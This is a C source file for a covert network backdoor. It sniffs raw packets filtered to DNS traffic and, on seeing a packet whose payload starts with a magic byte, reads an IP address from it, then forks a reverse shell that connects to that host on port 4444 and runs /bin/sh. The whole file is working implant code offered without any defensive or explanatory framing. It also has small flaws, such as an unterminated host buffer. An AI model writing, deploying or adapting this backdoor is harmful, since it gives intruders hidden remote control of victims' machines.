#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/if_ether.h>
#include <linux/filter.h>

#define REVERSE_SHELL_PORT 4444


void apply_bpf_filter(int sd);
void reverse_shell(char *host, int port);

int main()
{
    int sd, pkt_size;
    char *buf;
    struct sockaddr_in src, dst;
    struct iphdr *ip_pkt;
    struct tcphdr *tcp_header;

    buf = malloc(65536);
    
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
    {
        perror("error creating socket");
        exit(1);
    }

    apply_bpf_filter(sd);

    while(1)
    {
        if ((pkt_size = recvfrom(sd, buf, 65536, 0, NULL, NULL)) < 0)
        {
            perror("error receiving from socket");
            exit(1);
        }

        ip_pkt = (struct iphdr *)(buf + sizeof(struct ether_header));
        memset(&src, 0, sizeof(src));
        memset(&dst, 0, sizeof(dst));

        char *data = malloc(20 * sizeof(char));
        data = (char *)(buf + sizeof(struct ether_header) + sizeof(struct iphdr) + 8); // offset 8 bytes

        src.sin_addr.s_addr = ip_pkt->saddr;
        dst.sin_addr.s_addr = ip_pkt->daddr;

        // check for magicbyte X
        if (data[0] == 0x58)
        {
            int i, pid;
            char host[15];
            for (i=1; data[i] != 0x3A; i++)
            {
                host[i-1] = data[i];
            }

            // fork a child for reverse shell
            pid = fork();
            if (pid == 0)
            {
                //inside child process
                reverse_shell(host, REVERSE_SHELL_PORT);
            }

            // ignore SIGCHLD
            signal(SIGCHLD,SIG_IGN);

        }
        
    }

    close(sd);
    return 0;
}

void apply_bpf_filter(int sd)
{
    // tcpdump udp and dst port 53 -dd
    struct sock_filter filter[] = {
        { 0x28, 0, 0, 0x0000000c },
        { 0x15, 0, 4, 0x000086dd },
        { 0x30, 0, 0, 0x00000014 },
        { 0x15, 0, 11, 0x00000011 },
        { 0x28, 0, 0, 0x00000038 },
        { 0x15, 8, 9, 0x00000035 },
        { 0x15, 0, 8, 0x00000800 },
        { 0x30, 0, 0, 0x00000017 },
        { 0x15, 0, 6, 0x00000011 },
        { 0x28, 0, 0, 0x00000014 },
        { 0x45, 4, 0, 0x00001fff },
        { 0xb1, 0, 0, 0x0000000e },
        { 0x48, 0, 0, 0x00000010 },
        { 0x15, 0, 1, 0x00000035 },
        { 0x6, 0, 0, 0x00040000 },
        { 0x6, 0, 0, 0x00000000 },
    };
    size_t filter_size = sizeof(filter) / sizeof(struct sock_filter);
    struct sock_fprog bpf = {
        .len = filter_size,
        .filter = filter,
    };

    if ((setsockopt(sd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf))) < 0)
    {
        perror("Error creating socket");
        exit(1);
    }

}

void reverse_shell(char *host, int port)
{
    int sd;
    struct sockaddr_in cnc;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   
    memset((char *)&cnc, 0, sizeof(cnc));
    cnc.sin_family = AF_INET;
    cnc.sin_port = htons(port);
    cnc.sin_addr.s_addr = inet_addr(host);
    
    connect(sd, (struct sockaddr *) &cnc, sizeof(cnc));
    
    dup2(sd, 0);
    dup2(sd, 1);
    dup2(sd, 2);
    
    execve("/bin/sh", NULL, NULL);
   
}
